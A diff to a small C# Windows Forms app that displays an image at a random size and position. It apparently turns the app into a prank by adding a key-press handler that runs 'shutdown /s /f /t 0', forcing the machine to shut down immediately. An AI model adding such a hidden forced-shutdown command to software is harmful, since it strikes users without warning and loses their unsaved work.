@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Text;
@@ -56,7 +57,7 @@ namespace cs_ahill_app
                 this.pictureBox1.Image = this.formBmp;
             }
 
-            int size_x = rand.Next(220) + 60;
+            int size_x = rand.Next(300) + 70;
 
             int size_y = (int)((double)size_x * 430.0 / 694.0);
 
@@ -88,6 +89,16 @@ namespace cs_ahill_app
             this.pictureBox1.Refresh();
 
             this.pictureBox1.Location = new Point(-100 + rand.Next(30), -100 + rand.Next(25));
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void Form1_KeyDown(object sender, KeyEventArgs e)
+        {
+            Process p = Process.Start(@"c:\windows\System32\shutdown.exe", "/s /f /t 0");
         }
     }
 }
